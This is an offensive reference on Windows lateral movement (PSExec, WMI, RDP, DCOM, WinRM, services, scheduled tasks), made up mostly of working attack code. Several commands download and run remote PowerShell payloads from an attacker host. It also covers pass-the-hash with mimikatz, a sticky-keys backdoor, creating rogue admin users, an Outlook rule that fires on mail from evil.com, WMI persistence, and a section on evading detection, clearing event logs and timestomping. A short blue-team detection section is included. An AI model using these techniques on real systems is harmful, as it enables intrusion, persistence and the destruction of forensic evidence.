# Windows Remote Access Techniques Reference

## ELI5: The Hotel Master Key System

### The Universal Access Analogy

Imagine you're a hotel manager with different ways to enter any room:

**Traditional Method:**
```
Walk to room → Use physical key → Open door
(Go to computer → Type password → Login)
```

**Our Remote Methods:**
```
PSExec = The maintenance master key (opens any door, leaves service records)
WMI = The invisible butler (enters through walls, no one sees him)
RDP = The security camera takeover (become the person watching the screens)
DCOM = The room service tunnel (hidden passages between rooms)
```

### Why Windows Allows Remote Access

**Windows Is Built for Enterprise Management:**
```
IT Admin: "I need to fix 1000 computers"
Windows: "Here are 50 different remote access methods!"
Attackers: "Don't mind if we do..."
```

**The Remote Access Buffet:**
- **PSExec**: Service-based execution
- **WMI**: Management interface abuse
- **WinRM**: PowerShell remoting
- **RDP**: Full desktop access
- **DCOM**: Distributed COM objects
- **Scheduled Tasks**: Remote task creation
- **Services**: Remote service manipulation

### Choosing the Right Master Key

```
Need stealth? → WMI (hard to detect)
Need interactive? → RDP (full desktop)
Need reliable? → PSExec (always works)
Need fileless? → WMI/PowerShell (memory only)
Need persistence? → Services/Scheduled Tasks
```

## PSExec and Variants Deep Dive

### Understanding PSExec Internals

**How PSExec Really Works:**
```
1. Connect to ADMIN$ share → Copy service binary
2. Connect to Service Manager → Create new service
3. Start service → Service runs your command
4. Get output via named pipe → Delete service
5. Remove service binary → Clean up artifacts
```

### Classic PSExec Implementation

```powershell
# Original Sysinternals PSExec
.\PsExec.exe \\targethost -u Administrator -p Password123 cmd.exe

# With pass-the-hash
.\PsExec.exe \\targethost -u Administrator -p aad3b435b51404eeaad3b435b51404ee:32ED87BDB5FDC5E9CBA88547376818D4 cmd.exe

# System shell
.\PsExec.exe \\targethost -s cmd.exe

# Copy and execute file
.\PsExec.exe \\targethost -c payload.exe

# Execute on multiple hosts
.\PsExec.exe \\host1,host2,host3 -u Domain\Admin -p Pass cmd.exe

# With custom service name
.\PsExec.exe \\targethost -r customsvc -u Admin -p Pass cmd.exe
```

### Impacket PSExec (Python)

```python
#!/usr/bin/env python3
from impacket.examples import psexec

# Basic psexec
psexec.py domain/username:password@target

# With hash
psexec.py domain/username@target -hashes aad3b435b51404eeaad3b435b51404ee:32ED87BDB5FDC5E9CBA88547376818D4

# Custom service name
psexec.py domain/username:password@target -service-name legitsvc

# Execute specific command
psexec.py domain/username:password@target -c "whoami /all"
```

### Custom PSExec Implementation

```csharp
using System;
using System.Runtime.InteropServices;
using System.ServiceProcess;

public class CustomPsExec
{
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern IntPtr OpenSCManager(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern IntPtr CreateService(
        IntPtr hSCManager,
        string lpServiceName,
        string lpDisplayName,
        uint dwDesiredAccess,
        uint dwServiceType,
        uint dwStartType,
        uint dwErrorControl,
        string lpBinaryPathName,
        string lpLoadOrderGroup,
        IntPtr lpdwTagId,
        string lpDependencies,
        string lpServiceStartName,
        string lpPassword
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

    public static void ExecuteRemote(string target, string command)
    {
        // Copy service binary to target
        string remotePath = $@"\\{target}\ADMIN$\temp.exe";
        System.IO.File.Copy("service.exe", remotePath);

        // Connect to Service Control Manager
        IntPtr scmHandle = OpenSCManager($@"\\{target}", null, 0xF003F);

        // Create service
        IntPtr serviceHandle = CreateService(
            scmHandle,
            "TempService",
            "Temp Service",
            0xF01FF,
            0x00000010,  // SERVICE_WIN32_OWN_PROCESS
            0x00000003,  // SERVICE_DEMAND_START
            0x00000001,  // SERVICE_ERROR_NORMAL
            $@"C:\Windows\temp.exe {command}",
            null,
            IntPtr.Zero,
            null,
            null,
            null
        );

        // Start service
        StartService(serviceHandle, 0, null);

        // Cleanup
        DeleteService(serviceHandle);
        CloseServiceHandle(serviceHandle);
        CloseServiceHandle(scmHandle);

        // Delete service binary
        System.IO.File.Delete(remotePath);
    }

    // Named pipe for output
    public static string GetOutput(string target)
    {
        string pipeName = $@"\\{target}\pipe\psexecsvc";
        using (var pipe = new System.IO.Pipes.NamedPipeClientStream(target, "psexecsvc"))
        {
            pipe.Connect(5000);
            using (var reader = new System.IO.StreamReader(pipe))
            {
                return reader.ReadToEnd();
            }
        }
    }
}
```

### PSExec Alternatives

```powershell
# RemCom (PSExec alternative)
.\RemCom.exe \\targethost "cmd.exe"

# PAExec (PSExec alternative with better features)
.\paexec.exe \\targethost -s cmd.exe -csrc ".\payload.exe"

# PSExec via PowerShell (no binary needed)
function Invoke-PSExec {
    param($ComputerName, $Command, $Credential)

    # Create service remotely
    $service = Get-WmiObject -Class Win32_Service -ComputerName $ComputerName -Credential $Credential |
        Where {$_.Name -eq "TempService"}

    if($service) {
        $service.Delete()
    }

    $service = ([wmiclass]"\\$ComputerName\root\cimv2:Win32_Service").Create(
        "TempService",
        "Temp Service",
        "C:\Windows\System32\cmd.exe /c $Command",
        $null,
        $null,
        $false,
        "Manual",
        $null,
        $null,
        $null,
        $null,
        $null
    )

    # Start service
    $service = Get-WmiObject -Class Win32_Service -ComputerName $ComputerName -Filter "Name='TempService'"
    $service.StartService()

    # Cleanup
    Start-Sleep -Seconds 2
    $service.Delete()
}
```

## WMI/WMIC Remote Execution

### WMI Architecture Overview

```
Windows Management Instrumentation (WMI)
            ↓
    DCOM (Port 135)
            ↓
    Dynamic RPC Ports
            ↓
    Win32_Process.Create()
            ↓
    Remote Execution!
```

### WMI Command Execution Methods

```powershell
# Method 1: WMIC command line
wmic /node:targethost /user:Administrator /password:Password123 process call create "cmd.exe /c whoami > C:\output.txt"

# Method 2: PowerShell WMI
Invoke-WmiMethod -ComputerName targethost -Credential $cred -Class Win32_Process -Name Create -ArgumentList "powershell.exe -enc <base64>"

# Method 3: CIM (newer than WMI)
Invoke-CimMethod -ComputerName targethost -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"}

# Method 4: WMI with hash
$secpass = ConvertTo-SecureString 'PlainTextPassword' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $secpass)

$options = New-CimSessionOption -Protocol Dcom
$session = New-CimSession -ComputerName targethost -Credential $cred -SessionOption $options

Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = "powershell.exe -nop -w hidden -c `"IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/shell.ps1')`""
}
```

### Advanced WMI Techniques

```csharp
using System;
using System.Management;

public class WMIExecution
{
    public static void ExecuteCommand(string target, string username, string password, string command)
    {
        // Connection options
        ConnectionOptions options = new ConnectionOptions();
        options.Username = username;
        options.Password = password;
        options.Impersonation = ImpersonationLevel.Impersonate;
        options.EnablePrivileges = true;

        // Management scope
        ManagementScope scope = new ManagementScope($@"\\{target}\root\cimv2", options);
        scope.Connect();

        // Create process
        ManagementClass processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null);
        ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
        inParams["CommandLine"] = command;

        // Execute
        ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);

        uint returnValue = (uint)outParams["ReturnValue"];
        uint processId = (uint)outParams["ProcessId"];

        Console.WriteLine($"Process created with PID: {processId}");
    }

    public static void WMIEventSubscription(string target, string payload)
    {
        // Create permanent WMI event subscription for persistence
        ManagementScope scope = new ManagementScope($@"\\{target}\root\subscription");

        // Event Filter
        ManagementClass eventFilterClass = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
        ManagementObject eventFilter = eventFilterClass.CreateInstance();
        eventFilter["Name"] = "MyFilter";
        eventFilter["Query"] = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
        eventFilter["QueryLanguage"] = "WQL";
        eventFilter["EventNamespace"] = @"root\cimv2";
        eventFilter.Put();

        // Event Consumer
        ManagementClass consumerClass = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null);
        ManagementObject consumer = consumerClass.CreateInstance();
        consumer["Name"] = "MyConsumer";
        consumer["CommandLineTemplate"] = payload;
        consumer.Put();

        // Bind Filter to Consumer
        ManagementClass bindingClass = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null);
        ManagementObject binding = bindingClass.CreateInstance();
        binding["Filter"] = eventFilter.Path.RelativePath;
        binding["Consumer"] = consumer.Path.RelativePath;
        binding.Put();
    }
}
```

### Fileless WMI Execution

```powershell
# Execute PowerShell without writing to disk
$code = @'
$client = New-Object Net.WebClient
$client.DownloadString("http://10.10.10.10/payload.ps1") | IEX
'@

$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))

# Execute via WMI
Invoke-WmiMethod -ComputerName target -Class Win32_Process -Name Create -ArgumentList "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc $encoded"

# WMI via registry (sneakier)
$key = "HKLM:\SOFTWARE\Classes\hello"
$value = "powershell.exe -nop -w hidden -c `"IEX([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('BASE64PAYLOAD')))`""

Invoke-WmiMethod -ComputerName target -Class StdRegProv -Name SetStringValue -ArgumentList @(
    2147483650,  # HKEY_LOCAL_MACHINE
    "SOFTWARE\Classes\hello",
    "",
    $value
)

# Trigger via WMI event
Invoke-WmiMethod -ComputerName target -Class Win32_Process -Name Create -ArgumentList "cmd /c reg query HKLM\SOFTWARE\Classes\hello"
```

## RDP Techniques

### RDP Session Hijacking

```powershell
# List existing sessions
qwinsta /server:targethost

# Or remotely via WMI
Get-WmiObject -Class Win32_LogonSession -ComputerName targethost |
    Select LogonId, LogonType, StartTime, @{N='User';E={
        $id = $_.LogonId
        (Get-WmiObject -Class Win32_LoggedOnUser -ComputerName targethost |
            Where {$_.Dependent -match $id}).Antecedent -replace '.*Name="([^"]+)".*','$1'
    }}

# Hijack existing RDP session (requires SYSTEM)
function Invoke-SessionHijack {
    param($SessionId)

    # Create service to run as SYSTEM
    $service = @"
    tscon.exe $SessionId /dest:rdp-tcp#0
"@

    sc.exe create SessionHijack binpath= "cmd.exe /c $service"
    sc.exe start SessionHijack
    sc.exe delete SessionHijack
}

# Shadow RDP session (Windows 10/Server 2016+)
mstsc.exe /shadow:SessionID /v:targethost /noConsentPrompt /control
```

### Restricted Admin Mode RDP

```powershell
# Enable Restricted Admin Mode on target
$regPath = "HKLM:\System\CurrentControlSet\Control\Lsa"
Set-ItemProperty -Path $regPath -Name DisableRestrictedAdmin -Value 0

# Connect with pass-the-hash via Restricted Admin
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:32ED87BDB5FDC5E9CBA88547376818D4 /run:`"mstsc.exe /restrictedadmin`"" "exit"

# Or with xfreerdp
xfreerdp /v:targethost /u:Administrator /d:CORP /pth:32ED87BDB5FDC5E9CBA88547376818D4 /cert:ignore +clipboard
```

### RemoteApp Abuse

```powershell
# Publish cmd.exe as RemoteApp
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\TSAppAllowList\Applications\cmd"

New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name Name -Value "Command Prompt"
Set-ItemProperty -Path $regPath -Name Path -Value "C:\Windows\System32\cmd.exe"
Set-ItemProperty -Path $regPath -Name CommandLineSetting -Value 1
Set-ItemProperty -Path $regPath -Name RequiredCommandLine -Value ""

# Connect to RemoteApp
mstsc.exe /v:targethost /app:"||cmd"

# Escape from published app to full desktop
# In RemoteApp window: Ctrl+Alt+End → Task Manager → File → Run → explorer.exe
```

### RDP Tunneling

```powershell
# SSH tunnel for RDP
ssh -L 3389:targethost:3389 user@jumpbox

# Then connect locally
mstsc.exe /v:localhost

# Reverse RDP tunnel
# On target:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=127.0.0.1 connectport=3389

# ProxyChains RDP
proxychains xfreerdp /v:targethost /u:Administrator /p:Password123

# RDP over WebSocket
# Server side:
websocat -s 0.0.0.0:8080 tcp:127.0.0.1:3389

# Client side:
websocat ws://targethost:8080 tcp-l:127.0.0.1:3389
mstsc.exe /v:localhost
```

### Sticky Keys Backdoor

```powershell
# Replace sethc.exe with cmd.exe for backdoor
# At login screen, press Shift 5 times = SYSTEM shell

# Method 1: Direct replacement
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
Copy-Item C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe -Force

# Method 2: Registry hijack (stealthier)
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name Debugger -Value "C:\Windows\System32\cmd.exe"

# Method 3: DLL hijack in Sticky Keys
# Create malicious msvcrt.dll, place in System32
# When sethc.exe loads, it executes our DLL
```

## DCOM Exploitation

### DCOM Fundamentals

```powershell
# DCOM = Distributed COM
# Allows instantiation of COM objects on remote machines

# Find available DCOM applications
Get-CimInstance -ClassName Win32_DCOMApplication |
    Select AppID, Name |
    Sort Name

# Common exploitable DCOM objects:
# - MMC20.Application (MMC)
# - ShellWindows (Explorer)
# - ShellBrowserWindow (Explorer)
# - Excel.Application (Excel)
# - Outlook.Application (Outlook)
# - Visio.Application (Visio)
# - PowerPoint.Application (PowerPoint)
```

### MMC20.Application DCOM

```powershell
# MMC DCOM lateral movement
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","targethost"))

$dcom.Document.ActiveView.ExecuteShellCommand(
    "powershell.exe",
    $null,
    "-nop -w hidden -c `"IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/shell.ps1')`"",
    "7"  # Hidden window
)

# With credentials
$options = New-CimSessionOption -Protocol Dcom
$session = New-CimSession -ComputerName targethost -Credential $cred -SessionOption $options

$dcom = [System.Activator]::CreateInstance(
    [type]::GetTypeFromProgID("MMC20.Application","targethost"),
    $session
)
```

### ShellWindows/ShellBrowserWindow DCOM

```powershell
# ShellWindows DCOM execution
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","targethost"))

$item = $dcom.Item()
$item.Document.Application.ShellExecute(
    "cmd.exe",
    "/c powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/shell.ps1')",
    "C:\Windows\System32",
    $null,
    0
)

# ShellBrowserWindow variant
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","targethost"))

$dcom.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
```

### Excel.Application DCOM

```powershell
# Excel DCOM with macro execution
$excel = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","targethost"))

$excel.Visible = $false
$excel.DisplayAlerts = $false

# Create new workbook
$workbook = $excel.Workbooks.Add()
$sheet = $workbook.ActiveSheet

# Add macro
$code = @'
Sub Auto_Open()
    Shell "powershell.exe -nop -c IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/shell.ps1')", vbHide
End Sub
'@

$excel.VBE.ActiveVBProject.VBComponents.Item(1).CodeModule.AddFromString($code)

# Save and execute
$workbook.SaveAs("C:\Users\Public\update.xlsm", 52)  # 52 = xlOpenXMLWorkbookMacroEnabled
$workbook.Close()

# Open to trigger macro
$excel.Workbooks.Open("C:\Users\Public\update.xlsm")

# Cleanup
Start-Sleep -Seconds 5
$excel.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($excel) | Out-Null
```

### Outlook.Application DCOM

```powershell
# Outlook DCOM for email access and execution
$outlook = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application","targethost"))

# Create email with malicious attachment
$mail = $outlook.CreateItem(0)  # 0 = Mail item
$mail.Subject = "Important Update"
$mail.Body = "Please review the attached file"
$mail.To = "target@domain.com"
$mail.Attachments.Add("C:\payload.exe")

# Send or save to drafts
$mail.Save()  # Saves to drafts
# $mail.Send()  # Sends email

# Execute via Outlook rules
$namespace = $outlook.GetNamespace("MAPI")
$inbox = $namespace.GetDefaultFolder(6)  # 6 = Inbox
$rules = $namespace.DefaultStore.GetRules()

$rule = $rules.Create("ExecuteRule", 1)  # 1 = Receive rule
$rule.Conditions.SenderEmailAddress.Address = "trigger@evil.com"
$rule.Actions.RunAProgram.FilePath = "C:\Windows\System32\cmd.exe"
$rule.Actions.RunAProgram.Enabled = $true

$rules.Save()
```

## Advanced Remote Techniques

### WinRM/PowerShell Remoting

```powershell
# Enable PowerShell Remoting on target
Enable-PSRemoting -Force

# Or via WMI
Invoke-WmiMethod -ComputerName targethost -Class Win32_Process -Name Create -ArgumentList "powershell.exe -c Enable-PSRemoting -Force"

# Create PSSession
$session = New-PSSession -ComputerName targethost -Credential $cred

# Execute commands
Invoke-Command -Session $session -ScriptBlock { whoami }

# Copy and execute file
Copy-Item -Path "C:\local\payload.exe" -Destination "C:\remote\payload.exe" -ToSession $session
Invoke-Command -Session $session -ScriptBlock { C:\remote\payload.exe }

# Interactive session
Enter-PSSession -ComputerName targethost

# With SSL
$options = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
Enter-PSSession -ComputerName targethost -UseSSL -SessionOption $options
```

### Service Manipulation

```powershell
# Create remote service
sc.exe \\targethost create EvilService binpath= "cmd.exe /c net user hacker Password123 /add"
sc.exe \\targethost start EvilService
sc.exe \\targethost delete EvilService

# Via PowerShell
New-Service -Name "EvilService" -ComputerName targethost -BinaryPathName "C:\Windows\System32\cmd.exe /c whoami > C:\output.txt"

# Modify existing service
sc.exe \\targethost config ServiceName binpath= "cmd.exe /c C:\payload.exe"
sc.exe \\targethost stop ServiceName
sc.exe \\targethost start ServiceName
```

### Scheduled Task Execution

```powershell
# Create scheduled task remotely
schtasks /create /tn "MyTask" /tr "C:\Windows\System32\cmd.exe /c whoami > C:\output.txt" /sc once /st 00:00 /S targethost /RU System

# Execute immediately
schtasks /run /tn "MyTask" /S targethost

# Via PowerShell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -c IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/shell.ps1')"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
$principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Principal $principal -ComputerName targethost

# Cleanup
Unregister-ScheduledTask -TaskName "MyTask" -ComputerName targethost -Confirm:$false
```

## Detection Evasion and OPSEC

### Avoiding Detection

```powershell
# Use living-off-the-land binaries
# Instead of PSExec.exe, use:
sc.exe \\target create TempSvc binpath= "cmd /c whoami"

# Blend with legitimate traffic
# Name services/tasks like legitimate ones:
$legitimateNames = @(
    "WindowsUpdateService",
    "MicrosoftEdgeUpdate",
    "GoogleUpdateService",
    "AdobeUpdateService",
    "OneDriveSync"
)

$serviceName = $legitimateNames | Get-Random

# Use common ports
# WMI = 135
# SMB = 445
# RDP = 3389
# WinRM = 5985/5986

# Time your attacks
$hour = (Get-Date).Hour
if ($hour -lt 8 -or $hour -gt 18) {
    Write-Host "Waiting for business hours..."
    return
}

# Clean up immediately
$cleanup = {
    Remove-Item "\\$target\ADMIN$\temp.exe" -Force
    sc.exe \\$target delete TempService
    schtasks /delete /tn "TempTask" /S $target /F
    Get-WmiObject -Class __EventFilter -ComputerName $target -Filter "Name='TempFilter'" | Remove-WmiObject
}
```

### Anti-Forensics

```powershell
# Clear event logs after execution
wevtutil cl System /r:targethost
wevtutil cl Security /r:targethost
wevtutil cl Application /r:targethost

# Or selectively remove events
Get-WinEvent -ComputerName targethost -FilterHashtable @{LogName='Security';ID=4624,4672,4688} |
    Where {$_.TimeCreated -gt (Get-Date).AddMinutes(-5)} |
    ForEach { wevtutil delete-event Security $_.RecordId /r:targethost }

# Timestomping
$file = Get-Item "\\targethost\C$\Windows\Temp\payload.exe"
$file.CreationTime = (Get-Date).AddDays(-90)
$file.LastAccessTime = (Get-Date).AddDays(-30)
$file.LastWriteTime = (Get-Date).AddDays(-30)
```

## Detection Opportunities (Blue Team)

```powershell
# Monitor for PSExec patterns
Get-WinEvent -FilterHashtable @{LogName='System';ID=7045} |
    Where {$_.Message -match "PSEXESVC|ADMIN\$"}

# Detect WMI lateral movement
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-WMI-Activity/Operational';ID=5861}

# Monitor DCOM usage
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-DCOM';ID=10028}

# RDP session monitoring
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-TerminalServices-LocalSessionManager/Operational';ID=21,22,25}

# PowerShell remoting
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';ID=40961,40962,8193,8194,8197}
```

## Quick Reference Matrix

| Method | Port | Requires | Detectable | Fileless | Speed |
|--------|------|----------|------------|----------|--------|
| PSExec | 445 | Admin+SMB | High | No | Fast |
| WMI | 135+RPC | Admin | Medium | Yes | Fast |
| WinRM | 5985 | Admin+Config | Low | Yes | Fast |
| RDP | 3389 | RDP Access | High | N/A | Slow |
| DCOM | 135+RPC | Admin | Low | Yes | Medium |
| SchTask | 445 | Admin | Medium | Yes | Fast |
| Services | 445 | Admin | High | No | Fast |

## Conclusion

Windows remote access is like having a master key ring - each key opens different doors, leaves different traces, and requires different permissions. The key principles:

1. **Multiple methods exist** - If one fails, try another
2. **Living-off-the-land wins** - Use what's already there
3. **Authentication is often the same** - Hash/ticket/password all work
4. **Cleanup is critical** - Don't leave artifacts
5. **Blend with normal** - Look like legitimate admin activity

Remember: With great access comes great logs. Every remote action leaves traces - know what you're leaving behind.

## Quick Commands

```powershell
# PSExec
psexec.py domain/user:pass@target

# WMI
wmic /node:target process call create "cmd"

# WinRM
Enter-PSSession -ComputerName target

# DCOM
$dcom = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))

# Service
sc \\target create svc binpath= "cmd"

# Task
schtasks /create /S target /tn task /tr cmd
```